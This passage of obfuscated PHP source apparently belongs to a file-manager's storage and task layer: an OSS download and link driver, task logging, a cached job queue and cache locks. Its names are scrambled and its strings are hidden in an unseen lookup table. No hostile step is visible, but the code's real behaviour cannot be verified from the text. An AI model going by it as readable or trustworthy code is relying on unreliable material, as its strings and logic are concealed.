array(OSS\OssClient::OSS_FILE_DOWNLOAD => $´ãí±‘Û); $Ö™®ÀøË = $this->trafficLimit($½ÛîÔÍÔ[112], $Ö™®ÀøË); $this->client->getObject($this->bucket, $this->pathEncode($Ë±°“¥¿), $Ö™®ÀøË); } catch (OSS\Core\OssException $ğß±×ñ) { $this->writeLog(__FUNCTION__ . $½ÛîÔÍÔ[214] . $ğß±×ñ->getMessage()); return !1; } return $´ãí±‘Û; } public function fileSubstr($ü¼™•², $œ¾îÒº½ = 0, $²É€Å´ = false) { if ($œ¾îÒº½ === -1) { $ı£§õ² = array(); } else { if ($²É€Å´ === !1) { $œ‡ûÔİÇ = $this->size($ü¼™•²); } else { $œ‡ûÔİÇ = $œ¾îÒº½ + $²É€Å´ - 1; } $ı£§õ² = array(OSS\OssClient::OSS_RANGE => "{$œ¾îÒº½}\x2d{$œ‡ûÔİÇ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ü¼™•²), $ı£§õ²); } catch (OSS\Core\OssException $Â¾·ÄÕ) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $Â¾·ÄÕ->getMessage()); think_exception($Â¾·ÄÕ->getMessage()); return !1; } } private function trafficLimit($·èË±ñõ, $¼İ¹É¦ = array(), $÷ú³´²û = false) { $µÉù¹é… =& $_SERVER[¡¬ıÜ ƒ]; if ($·èË±ñõ == $µÉù¹é…[1498] && $this->isUploadServer() || $·èË±ñõ == $µÉù¹é…[112] && $this->isFileOutServer()) { return $¼İ¹É¦; } $ÕÌÎØÃ¨ = floatval($GLOBALS[$µÉù¹é…[6]][$µÉù¹é…[92]][$µÉù¹é…[110]][$·èË±ñõ]) * 1024 * 1024 * 8; if (!$ÕÌÎØÃ¨) { return $¼İ¹É¦; } $ÕÌÎØÃ¨ = $ÕÌÎØÃ¨ < 819200 ? 819200 : ($ÕÌÎØÃ¨ > 838860800 ? 838860800 : $ÕÌÎØÃ¨); if ($÷ú³´²û) { $¼İ¹É¦[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕÌÎØÃ¨); } else { if (!isset($¼İ¹É¦[OSS\OssClient::OSS_HEADERS])) { $¼İ¹É¦[OSS\OssClient::OSS_HEADERS] = array(); } $¼İ¹É¦[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÕÌÎØÃ¨); } return $¼İ¹É¦; } public function link($»“¹‹ÆŒ, $Ü¼ÕÔ˜Ñ = array()) { $Á³¤Üƒá =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->exist($»“¹‹ÆŒ) || $this->isFolder($»“¹‹ÆŒ)) { return !1; } try { $Ü¼ÕÔ˜Ñ = $this->trafficLimit($Á³¤Üƒá[112], $Ü¼ÕÔ˜Ñ, !0); $µçÉ‰û¨ = $this->client->signUrl($this->bucket, $this->pathEncode($»“¹‹ÆŒ), 3600 * 12, $Á³¤Üƒá[1507], $Ü¼ÕÔ˜Ñ); return $this->getCdnLink($µçÉ‰û¨); } catch (OSS\Core\OssException $ÚÒŸÇç) { $this->writeLog(__FUNCTION__ . $Á³¤Üƒá[214] . $ÚÒŸÇç->getMessage()); return !1; } } public function fileOut($ëßåıÊù, $‡†•¹Ìµ = false, $«‘£’Â™ = false, $»†ÑöÍÉ = '') { $ÛáÌ½Åà =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ëßåıÊù, $‡†•¹Ìµ, $«‘£’Â™, $»†ÑöÍÉ); } if (!$«‘£’Â™) { $«‘£’Â™ = $this->pathThis($ëßåıÊù); } $«‘£’Â™ = rawurlencode($«‘£’Â™); $¢şìšŞ = get_file_mime(get_path_ext($«‘£’Â™)); if ($¢şìšŞ == $ÛáÌ½Åà[250]) { return parent::fileOut($ëßåıÊù, $‡†•¹Ìµ, $«‘£’Â™, $»†ÑöÍÉ); } $‡†•¹Ìµ = $‡†•¹Ìµ ? $ÛáÌ½Åà[1508] : $ÛáÌ½Åà[1509]; $Ü£Ï×Ï¤ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÛáÌ½Åà[1510] . rawurlencode("{$‡†•¹Ìµ}\x3b\x66\x69\x6c\x65\x6e\141\x6d\x65\x3d{$«‘£’Â™}")); $Ü£Ï×Ï¤[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÛáÌ½Åà[1511] . rawurlencode($¢şìšŞ); $¤²ß¸ÃË = $this->link($ëßåıÊù, $Ü£Ï×Ï¤); $this->fileOutLink($¤²ß¸ÃË); } public function fileOutServer($¸õœßø¿, $Ø¤ª²Şñ = false, $²¹ÌÙ°¿ = false, $ï‡Í—º¤ = '') { parent::fileOut($¸õœßø¿, $Ø¤ª²Şñ, $²¹ÌÙ°¿, $ï‡Í—º¤); } public function fileOutImage($òÇÑû¿ª, $²ú€‡ƒ³ = 250) { if ($this->size($òÇÑû¿ª) > 1024 * 1024 * 20) { return $this->fileOutImageServer($òÇÑû¿ª, $²ú€‡ƒ³); } $ĞÍ·¯¨€ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¡¬ıÜ ƒ][1472] . $²ú€‡ƒ³); $â¹İà» = $this->link($òÇÑû¿ª, $ĞÍ·¯¨€); $this->fileOutLink($â¹İà»); } public function fileOutImageServer($µ¡»òÙµ, $«ş‹ÚïÈ = 250) { parent::fileOutImage($µ¡»òÙµ, $«ş‹ÚïÈ); } public function fileOutLink($¾ö¿é…¸) { $êÉ·Âæ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->isCdnHost() && substr($¾ö¿é…¸, 0, 7) == $êÉ·Âæ[218]) { $¾ö¿é…¸ = $êÉ·Âæ[219] . substr($¾ö¿é…¸, 7); } header($êÉ·Âæ[175] . $¾ö¿é…¸); die; } public function hashMd5($º¶·ºô, $É’³½ò = '') { $òÑ×ô´” =& $_SERVER[¡¬ıÜ ƒ]; $ò÷ûù è = $this->_objectMeta($º¶·ºô); if (!$ò÷ûù è) { return $òÑ×ô´”[12]; } if (!isset($ò÷ûù è[$òÑ×ô´”[1492]]) && !empty($É’³½ò)) { $ƒâÄŸ™… = $this->updateObjMeta($º¶·ºô, array($òÑ×ô´”[1492] => $É’³½ò)); $ò÷ûù è[$òÑ×ô´”[1492]] = $ƒâÄŸ™… ? $É’³½ò : $òÑ×ô´”[12]; } return isset($ò÷ûù è[$òÑ×ô´”[1492]]) ? strtolower($ò÷ûù è[$òÑ×ô´”[1492]]) : $òÑ×ô´”[12]; } public function size($÷°€»Ö) { $ËŸæœÃ¶ = $this->objectMeta($÷°€»Ö); return $ËŸæœÃ¶ ? $ËŸæœÃ¶[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function info($–¤±î¸) { if ($this->isFolder($–¤±î¸)) { return $this->folderInfo($–¤±î¸); } else { if ($this->isFile($–¤±î¸)) { return $this->fileInfo($–¤±î¸); } } return !1; } public function exist($äëÁÅ§÷) { return $this->isFile($äëÁÅ§÷) || $this->isFolder($äëÁÅ§÷); } public function isFile($ù¯”ÊÂ¶) { return !$this->isFolder($ù¯”ÊÂ¶) && $this->objectMeta($ù¯”ÊÂ¶); } public function isFolder($†ŞØßÇ¦) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][179], $†ŞØßÇ¦); } protected function objectMeta($åÃèÊ¸) { return $this->cacheMethod($_SERVER[¡¬ıÜ ƒ][181], $åÃèÊ¸); } protected function _objectMeta($˜†¢Ø) { $—Œ“¯¬ü =& $_SERVER[¡¬ıÜ ƒ]; try { $ğŠÖ½îº = $this->client->getObjectMeta($this->bucket, $this->pathEncode($˜†¢Ø)); } catch (OSS\Core\OssException $ß„’•ï’) { $this->writeLog(__FUNCTION__ . $—Œ“¯¬ü[214] . $ß„’•ï’->getMessage()); $ğŠÖ½îº = !1; } if ($ğŠÖ½îº) { $ğŠÖ½îº[$—Œ“¯¬ü[79]] = intval($ğŠÖ½îº[$—Œ“¯¬ü[1490]]); } return $ğŠÖ½îº; } protected function _isFolder($á±ÔãöÓ) { $ƒ´ıÇ· =& $_SERVER[¡¬ıÜ ƒ]; if ($á±ÔãöÓ == $ƒ´ıÇ·[12] || $á±ÔãöÓ == $ƒ´ıÇ·[8]) { return !0; } $í ôçé = array($ƒ´ıÇ·[1485] => $ƒ´ıÇ·[8], $ƒ´ıÇ·[1486] => rtrim($á±ÔãöÓ, $ƒ´ıÇ·[8]) . $ƒ´ıÇ·[8], $ƒ´ıÇ·[1487] => 1, $ƒ´ıÇ·[1488] => $ƒ´ıÇ·[12]); $òªÜåÁÉ = $this->client->listObjects($this->bucket, $í ôçé); if ($òªÜåÁÉ->getObjectList() || $òªÜåÁÉ->getPrefixList()) { return !0; } return !1; } public function writeLog($åîôñï‹ = '', $ÇÑÀ—ğº = false) { $¡£Œ§ï¹ =& $_SERVER[¡¬ıÜ ƒ]; $÷Ñ²¹öè = in_array(ACTION, array($¡£Œ§ï¹[212], $¡£Œ§ï¹[213])); if (!$÷Ñ²¹öè && !GLOBAL_DEBUG) { return; } $Æòİ¬Ïî = 0; if (stripos($åîôñï‹, $¡£Œ§ï¹[1512]) !== !1) { $Æòİ¬Ïî = 1; $¯İıô“ = explode($¡£Œ§ï¹[1513], $åîôñï‹); $åîôñï‹ = !empty($¯İıô“[1]) ? $¯İıô“[1] : $åîôñï‹; } else { if (stripos($åîôñï‹, $¡£Œ§ï¹[1514])) { $Æòİ¬Ïî = 2; $¯İıô“ = explode($¡£Œ§ï¹[1514], $åîôñï‹); $¯İıô“ = explode($¡£Œ§ï¹[4], $¯İıô“[0]); $åîôñï‹ = !empty($¯İıô“[1]) ? $¯İıô“[1] : $åîôñï‹; } } if ($÷Ñ²¹öè && I18n::getType() == $¡£Œ§ï¹[1515]) { if ($Æòİ¬Ïî == 1) { $åîôñï‹ = str_replace($¡£Œ§ï¹[1516], $¡£Œ§ï¹[1517], $åîôñï‹); } else { if ($Æòİ¬Ïî == 2) { $¯İıô“ = explode($¡£Œ§ï¹[214], $¯İıô“[0]); $Ëöûåì» = isset($¯İıô“[1]) ? $¯İıô“[1] : $¡£Œ§ï¹[12]; $¨¤Ïˆ¤À = array($¡£Œ§ï¹[1518] => $¡£Œ§ï¹[1519], $¡£Œ§ï¹[1520] => $¡£Œ§ï¹[1521], $¡£Œ§ï¹[1522] => $¡£Œ§ï¹[1523], $¡£Œ§ï¹[1524] => $¡£Œ§ï¹[1525], $¡£Œ§ï¹[1526] => $¡£Œ§ï¹[1527], $¡£Œ§ï¹[1528] => $¡£Œ§ï¹[1529], $¡£Œ§ï¹[1530] => $¡£Œ§ï¹[1531], $¡£Œ§ï¹[1532] => $¡£Œ§ï¹[1533], $¡£Œ§ï¹[1534] => $¡£Œ§ï¹[1535], $¡£Œ§ï¹[1536] => $¡£Œ§ï¹[1537]); if (isset($¨¤Ïˆ¤À[$Ëöûåì»])) { $åîôñï‹ = $¨¤Ïˆ¤À[$Ëöûåì»]; } } } if (stripos($åîôñï‹, $¡£Œ§ï¹[1538])) { $åîôñï‹ = $¡£Œ§ï¹[1539]; } } if (!trim($åîôñï‹)) { return; } parent::writeLog(trim($åîôñï‹), $ÇÑÀ—ğº); } } goto E¼ºÉ½ñÄ; bñœ¨Ùâ×: class TaskHttp extends Task { protected function startAfter() { $‘­ŸçÁ” =& $_SERVER[¡¬ıÜ ƒ]; $¢™Ñ¶ˆƒ =& $this->task; $¢™Ñ¶ˆƒ[$‘­ŸçÁ”[1863]] = 1; Hook::bind($‘­ŸçÁ”[1831], array($this, $‘­ŸçÁ”[1864])); Hook::bind($‘­ŸçÁ”[1833], array($this, $‘­ŸçÁ”[1865])); Hook::bind($‘­ŸçÁ”[1835], array($this, $‘­ŸçÁ”[1866])); } protected function endAfter() { $ØÈ÷ªÊ =& $_SERVER[¡¬ıÜ ƒ]; Hook::unbind($ØÈ÷ªÊ[1831], array($this, $ØÈ÷ªÊ[1864])); Hook::unbind($ØÈ÷ªÊ[1833], array($this, $ØÈ÷ªÊ[1865])); Hook::unbind($ØÈ÷ªÊ[1835], array($this, $ØÈ÷ªÊ[1866])); } public function progressStart($¼à¹²ñ’) { $¡ÈÑøİŸ =& $_SERVER[¡¬ıÜ ƒ]; $¥’Ğç¨» = curl_getinfo($¼à¹²ñ’); self::log($¡ÈÑøİŸ[1867] . $¥’Ğç¨»[$¡ÈÑøİŸ[384]]); self::valueSet($this->task[$¡ÈÑøİŸ[477]], $this->task); } public function progressEnd($Î†ø©ÅÎ) { $øöĞåÔİ =& $_SERVER[¡¬ıÜ ƒ]; self::log($øöĞåÔİ[1868] . $this->task[$øöĞåÔİ[477]]); $this->end(); } public function progress($­÷½ÔËû, $é¹¬„ıá, $ıÓŸİĞ, $Ùè”¨», $µòÎ»÷õ) { $Æ–æœØ³ =& $_SERVER[¡¬ıÜ ƒ]; $ËöúÂ· =& $this->task; if ($µòÎ»÷õ > 0) { $ËöúÂ·[$Æ–æœØ³[1151]] = $ËöúÂ·[$Æ–æœØ³[1151]] == 0 ? $Ùè”¨» : $ËöúÂ·[$Æ–æœØ³[1151]]; $ËöúÂ·[$Æ–æœØ³[1786]] = $µòÎ»÷õ; } else { if ($ıÓŸİĞ > 0) { $ËöúÂ·[$Æ–æœØ³[1151]] = $ËöúÂ·[$Æ–æœØ³[1151]] == 0 ? $é¹¬„ıá : $ËöúÂ·[$Æ–æœØ³[1151]]; $ËöúÂ·[$Æ–æœØ³[1786]] = $ıÓŸİĞ; } } $this->update(); self::log("\x70\162\x6f\x67\x72\x65\163\163\110\164\164\160\72\144\x6f\x77\x6e\x3a{$ıÓŸİĞ}\57{$é¹¬„ıá}\x3b\40\165\160\154\157\x61\144\x3a{$µòÎ»÷õ}\x2f{$Ùè”¨»}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($îóî¾¡», $ñ®Â×Û¢ = '', $ñ•Ü…ØÙ = 0, $úÍ’šÕá = '') { $ÒÅ½ø°Œ =& $_SERVER[¡¬ıÜ ƒ]; $úÍ’šÕá = $úÍ’šÕá ? $úÍ’šÕá : ($ñ®Â×Û¢ ? $ñ®Â×Û¢ : $îóî¾¡»); $úî·¤Ç = new Task($îóî¾¡», $ñ®Â×Û¢, $ñ•Ü…ØÙ, $úÍ’šÕá); $GLOBALS[$ÒÅ½ø°Œ[1869] . $îóî¾¡»] = new TaskLog($ÒÅ½ø°Œ[1768], $úî·¤Ç, $úÍ’šÕá); return $úî·¤Ç; } public function __construct($Ö§èá‰ = '', $ùÜ–ÕÉ = '', $şäá’Ô‹ = '') { $²Í…šƒ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Ö§èá‰) { $Ö§èá‰ = $²Í…šƒ[1768]; } $ŞŞ•›ªë = $Ö§èá‰ . $²Í…šƒ[464] . rand_string(10); if (!$şäá’Ô‹) { $şäá’Ô‹ = $Ö§èá‰ . $²Í…šƒ[53] . $şäá’Ô‹; } switch ($Ö§èá‰) { case $²Í…šƒ[1768]: if (!$ùÜ–ÕÉ || !$ùÜ–ÕÉ->task) { return echoLog($Ö§èá‰ . $²Í…šƒ[1870]); } $³Ö®…ÇÄ = $ùÜ–ÕÉ; $ŞŞ•›ªë = $³Ö®…ÇÄ->task[$²Í…šƒ[477]]; $Ö§èá‰ = $³Ö®…ÇÄ->task[$²Í…šƒ[477]]; if (!$³Ö®…ÇÄ->task[$²Í…šƒ[1671]]) { $³Ö®…ÇÄ->task[$²Í…šƒ[1671]] = $şäá’Ô‹ ? $şäá’Ô‹ : $Ö§èá‰; } break; case $²Í…šƒ[1871]: if (!$ùÜ–ÕÉ) { return echoLog($Ö§èá‰ . $²Í…šƒ[1872]); } $ÜÉ×Ëñó = is_string($ùÜ–ÕÉ) ? array($ùÜ–ÕÉ) : $ùÜ–ÕÉ; $³Ö®…ÇÄ = new TaskFileTransfer($ŞŞ•›ªë, $Ö§èá‰, 0, $şäá’Ô‹ ? $şäá’Ô‹ : $ÜÉ×Ëñó[0]); foreach ($ÜÉ×Ëñó as $ó»‘­·É) { $³Ö®…ÇÄ->addPath($ó»‘­·É); } break; case $²Í…šƒ[390]: if (!$ùÜ–ÕÉ) { return echoLog($Ö§èá‰ . $²Í…šƒ[1872]); } $ÜÉ×Ëñó = is_string($ùÜ–ÕÉ) ? array($ùÜ–ÕÉ) : $ùÜ–ÕÉ; $³Ö®…ÇÄ = new TaskZip($ŞŞ•›ªë, $Ö§èá‰, 0, $şäá’Ô‹ ? $şäá’Ô‹ : $ÜÉ×Ëñó[0]); foreach ($ÜÉ×Ëñó as $ó»‘­·É) { $³Ö®…ÇÄ->addPath($ó»‘­·É); } break; case $²Í…šƒ[1310]: if (!$ùÜ–ÕÉ) { return echoLog($Ö§èá‰ . $²Í…šƒ[1872]); } $³Ö®…ÇÄ = new TaskUnZip($ŞŞ•›ªë, $Ö§èá‰, 0, $şäá’Ô‹ ? $şäá’Ô‹ : $ùÜ–ÕÉ); if ($ùÜ–ÕÉ) { $³Ö®…ÇÄ->addFile($ùÜ–ÕÉ); } break; case $²Í…šƒ[152]: $³Ö®…ÇÄ = new TaskHttp($ŞŞ•›ªë, $Ö§èá‰); break; default: return; break; } $this->task = $³Ö®…ÇÄ; $this->taskID = $ŞŞ•›ªë; Hook::bind($²Í…šƒ[1806], array($this, $²Í…šƒ[1873])); Hook::bind($²Í…šƒ[1808], array($this, $²Í…šƒ[1874])); Hook::bind($²Í…šƒ[1802], array($this, $²Í…šƒ[1875])); echoLog($²Í…šƒ[1876] . $³Ö®…ÇÄ->task[$²Í…šƒ[1671]]); } public function __destruct() { $this->end(); } public function end($™àÉ‘‰ = '') { $ñÂòÛ‰Ë =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($™àÉ‘‰); $this->task = !1; $this->taskID = !1; Hook::unbind($ñÂòÛ‰Ë[1806], array($this, $ñÂòÛ‰Ë[1873])); Hook::unbind($ñÂòÛ‰Ë[1808], array($this, $ñÂòÛ‰Ë[1874])); Hook::unbind($ñÂòÛ‰Ë[1802], array($this, $ñÂòÛ‰Ë[1875])); } public function taskUpdate($¶Üšú™¿) { $ÑÏ¼Àš’ =& $_SERVER[¡¬ıÜ ƒ]; if (!$¶Üšú™¿ || $this->taskID != $¶Üšú™¿[$ÑÏ¼Àš’[477]]) { return; } $‡‰¤ñÎ¦ = 20; $Õß¼˜ÌĞ = intval($¶Üšú™¿[$ÑÏ¼Àš’[1787]] * $‡‰¤ñÎ¦); $«¾•ÔØ  = $ÑÏ¼Àš’[176] . str_repeat($ÑÏ¼Àš’[508], $Õß¼˜ÌĞ) . $ÑÏ¼Àš’[1102] . str_repeat($ÑÏ¼Àš’[53], $‡‰¤ñÎ¦ - $Õß¼˜ÌĞ) . $ÑÏ¼Àš’[178]; $¦·ÌÁß = $«¾•ÔØ  . sprintf($ÑÏ¼Àš’[1877], $¶Üšú™¿[$ÑÏ¼Àš’[1787]] * 100) . $ÑÏ¼Àš’[1878]; $©ÙñŸ® = $¦·ÌÁß . $¶Üšú™¿[$ÑÏ¼Àš’[1786]] . $ÑÏ¼Àš’[8] . $¶Üšú™¿[$ÑÏ¼Àš’[1151]] . LNG($ÑÏ¼Àš’[1879]); $ô¾Ş§ƒ = $ÑÏ¼Àš’[12]; if ($¶Üšú™¿[$ÑÏ¼Àš’[1863]]) { $©ÙñŸ® = $¦·ÌÁß . size_format($¶Üšú™¿[$ÑÏ¼Àš’[1786]]) . $ÑÏ¼Àš’[8] . size_format($¶Üšú™¿[$ÑÏ¼Àš’[1151]]); $ô¾Ş§ƒ = size_format($¶Üšú™¿[$ÑÏ¼Àš’[1788]]) . $ÑÏ¼Àš’[1880]; } if ($¶Üšú™¿[$ÑÏ¼Àš’[1153]]) { $¶Üšú™¿[$ÑÏ¼Àš’[1837]] = $¶Üšú™¿[$ÑÏ¼Àš’[1153]] . $ÑÏ¼Àš’[53] . $¶Üšú™¿[$ÑÏ¼Àš’[1837]]; } if ($¶Üšú™¿[$ÑÏ¼Àš’[1837]]) { $õµù¿ = $ÑÏ¼Àš’[12]; if ($¶Üšú™¿[$ÑÏ¼Àš’[1839]]) { $õµù¿ = $ÑÏ¼Àš’[50] . size_format($¶Üšú™¿[$ÑÏ¼Àš’[1840]]) . $ÑÏ¼Àš’[8] . size_format($¶Üšú™¿[$ÑÏ¼Àš’[1839]]); } $ô¾Ş§ƒ .= $¶Üšú™¿[$ÑÏ¼Àš’[1837]] . $õµù¿; } if ($¶Üšú™¿[$ÑÏ¼Àš’[843]] && !$¶Üšú™¿[$ÑÏ¼Àš’[1839]]) { $ô¾Ş§ƒ .= $ÑÏ¼Àš’[53] . size_format($¶Üšú™¿[$ÑÏ¼Àš’[1844]]) . $ÑÏ¼Àš’[8] . size_format($¶Üšú™¿[$ÑÏ¼Àš’[843]]); } echoLog($©ÙñŸ® . $ÑÏ¼Àš’[53] . $ô¾Ş§ƒ, !0); } public function taskEnd($ü¾æ‘Ã²) { $¤¼Œ»Ôâ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ü¾æ‘Ã² || $this->taskID != $ü¾æ‘Ã²[$¤¼Œ»Ôâ[477]]) { return; } $Åš¢ÂÜ× = $ü¾æ‘Ã² ? LNG($¤¼Œ»Ôâ[1881]) . $¤¼Œ»Ôâ[4] . $ü¾æ‘Ã²[$¤¼Œ»Ôâ[1786]] . $¤¼Œ»Ôâ[8] . $ü¾æ‘Ã²[$¤¼Œ»Ôâ[1151]] . LNG($¤¼Œ»Ôâ[1879]) . $¤¼Œ»Ôâ[74] : $¤¼Œ»Ôâ[12]; echoLog($¤¼Œ»Ôâ[1882] . $ü¾æ‘Ã²[$¤¼Œ»Ôâ[1671]] . ($ü¾æ‘Ã²[$¤¼Œ»Ôâ[528]] ? $¤¼Œ»Ôâ[74] . $ü¾æ‘Ã²[$¤¼Œ»Ôâ[528]] : $¤¼Œ»Ôâ[12]) . $¤¼Œ»Ôâ[74] . $Åš¢ÂÜ× . $¤¼Œ»Ôâ[1883] . sprintf($¤¼Œ»Ôâ[941], timeFloat() - $ü¾æ‘Ã²[$¤¼Œ»Ôâ[1789]]) . $¤¼Œ»Ôâ[1801]); $this->end(); } public function taskKill($ÖÎìŸˆ¿) { $Ş±ˆ”¬Œ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ÖÎìŸˆ¿ || $this->taskID != $ÖÎìŸˆ¿[$Ş±ˆ”¬Œ[477]]) { return; } echoLog($Ş±ˆ”¬Œ[1884] . $ÖÎìŸˆ¿[$Ş±ˆ”¬Œ[1671]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\145\x75\145\114\x65\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\165\145\x75\x65\104\x61\164\141"; const QUEUE_TIME = "\164\x61\163\153\121\x75\145\165\145\114\x61\x73\x74\122\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\121\165\145\165\145\x54\150\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¯ÈãìûÜ, $üä©ÈıŸ = array(), $™ŒíÙî¾ = '', $²Ú¥—Ï = '') { $èĞ›ìÏÖ =& $_SERVER[¡¬ıÜ ƒ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($²Ú¥—Ï && array_find_by_field(self::$listData, $èĞ›ìÏÖ[97], $²Ú¥—Ï)) { return !0; } if ($²Ú¥—Ï && array_find_by_field(self::$listDataAdd, $èĞ›ìÏÖ[97], $²Ú¥—Ï)) { return !0; } self::$listDataAdd[] = array($èĞ›ìÏÖ[343] => $¯ÈãìûÜ, $èĞ›ìÏÖ[1885] => $üä©ÈıŸ, $èĞ›ìÏÖ[528] => $™ŒíÙî¾, $èĞ›ìÏÖ[97] => $²Ú¥—Ï); return !0; } public static function addSubmit() { $îÂ¾³ş» =& $_SERVER[¡¬ıÜ ƒ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($îÂ¾³ş»[1886] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $îÂ¾³ş»[12], $îÂ¾³ş»[528])), $îÂ¾³ş»[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ıŞ¯©³„, $Ú¸¹Â©ë = array(), $öŠ‰ÆÂ  = '', $ˆ®¯Ï = '') { $Óš±Ö×ù =& $_SERVER[¡¬ıÜ ƒ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $•ÊË²ªñ = self::getAll(); if ($ˆ®¯Ï && array_find_by_field($•ÊË²ªñ, $Óš±Ö×ù[97], $ˆ®¯Ï)) { return !0; } $•ÊË²ªñ[] = array($Óš±Ö×ù[343] => $ıŞ¯©³„, $Óš±Ö×ù[1885] => $Ú¸¹Â©ë, $Óš±Ö×ù[528] => $öŠ‰ÆÂ , $Óš±Ö×ù[97] => $ˆ®¯Ï); self::setAll($•ÊË²ªñ); write_log($Óš±Ö×ù[1886] . $öŠ‰ÆÂ , $Óš±Ö×ù[197]); return !0; } public static function run() { $áË–‘ÌÜ =& $_SERVER[¡¬ıÜ ƒ]; $¾§µñ®Ä = self::getAll(); $º±Ê‚ì¨ = array_shift($¾§µñ®Ä); if (!$º±Ê‚ì¨) { return !1; } self::setAll($¾§µñ®Ä); $äö‹¥» = timeFloat(); $°ü®©Âô = $áË–‘ÌÜ[12]; try { $°ü®©Âô = Hook::apply($º±Ê‚ì¨[$áË–‘ÌÜ[343]], $º±Ê‚ì¨[$áË–‘ÌÜ[1885]]); } catch (Exception $äõÂóß†) { write_log($äõÂóß†, $áË–‘ÌÜ[1275]); } $ó·¿©æİ = number_format(timeFloat() - $äö‹¥», 3) . $áË–‘ÌÜ[1801]; if ($°ü®©Âô && is_string($°ü®©Âô)) { $ó·¿©æİ = $ó·¿©æİ . $áË–‘ÌÜ[1887] . $°ü®©Âô; } write_log($áË–‘ÌÜ[1888] . $º±Ê‚ì¨[$áË–‘ÌÜ[528]] . $áË–‘ÌÜ[1889] . $ó·¿©æİ, $áË–‘ÌÜ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ñ®íœ€¤ =& $_SERVER[¡¬ıÜ ƒ]; $¢î½±ŸÒ = self::threadCount() + 1; if ($¢î½±ŸÒ > 3 || !self::count()) { return; } write_log($Ñ®íœ€¤[1890] . $¢î½±ŸÒ, $Ñ®íœ€¤[197]); Cache::set(self::QUEUE_THREAD, $¢î½±ŸÒ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ñ®íœ€¤[1891], $Ñ®íœ€¤[197]); } public static function getKey($ñ•ë‚Ñ‹, $ã×üÔÛ = "\151\156\x74") { $¦Å”ê” =& $_SERVER[¡¬ıÜ ƒ]; Cache::removeMemory($ñ•ë‚Ñ‹); $—ÀÂĞÀ = Cache::get($ñ•ë‚Ñ‹); if ($ã×üÔÛ == $¦Å”ê”[365]) { return $—ÀÂĞÀ ? intval($—ÀÂĞÀ) : 0; } if ($ã×üÔÛ == $¦Å”ê”[1892]) { return is_array($—ÀÂĞÀ) ? $—ÀÂĞÀ : array(); } return $—ÀÂĞÀ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¡¬ıÜ ƒ][1892]); } public static function setAll($üëÈ¨ºŞ) { $ï²†ûä· = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($üëÈ¨ºŞ), $ï²†ûä·); Cache::set(self::QUEUE_DATA, $üëÈ¨ºŞ, $ï²†ûä·); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto CŠïÛ™‚Â²; b¥¼ŠóİØ: class CacheLockDatabase { public function lock($Õü±‰½, $™Ÿ‘ãñš = 0) { $…§Ÿ¡Ùì = Model($_SERVER[¡¬ıÜ ƒ][918]); $Ó™¼€‹ = microtime(!0) + $™Ÿ‘ãñš; while (microtime(!0) < $Ó™¼€‹) { $»¯ê§£ğ = $…§Ÿ¡Ùì->get($Õü±‰½); if (!$»¯ê§£ğ || $»¯ê§£ğ < microtime(!0)) { $¡ë‰ÈÃº = $…§Ÿ¡Ùì->set($Õü±‰½, $Ó™¼€‹); if ($¡ë‰ÈÃº) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($İœ™îĞú) { return Model($_SERVER[¡¬ıÜ ƒ][918])->get($İœ™îĞú); } public function unlock($£‡ÉÓ®ƒ) { Model($_SERVER[¡¬ıÜ ƒ][918])->remove($£‡ÉÓ®ƒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($îºÖô¿İ, $×ÑÙÜ›) { $“«ÔŒô =& $_SERVER[¡¬ıÜ ƒ]; if (!class_exists($“«ÔŒô[957])) { show_json($“«ÔŒô[958], !1); } $this->cacheTime = $×ÑÙÜ›; $this->handle = new Memcached(); if (is_array($îºÖô¿İ[$“«ÔŒô[959]]) && count($îºÖô¿İ[$“«ÔŒô[959]]) >= 1) { foreach ($îºÖô¿İ[$“«ÔŒô[959]] as $—ÄÒßÕ) { $¨¡†Çó = explode($“«ÔŒô[4], $—ÄÒßÕ); $this->handle->addServer($¨¡†Çó[0], 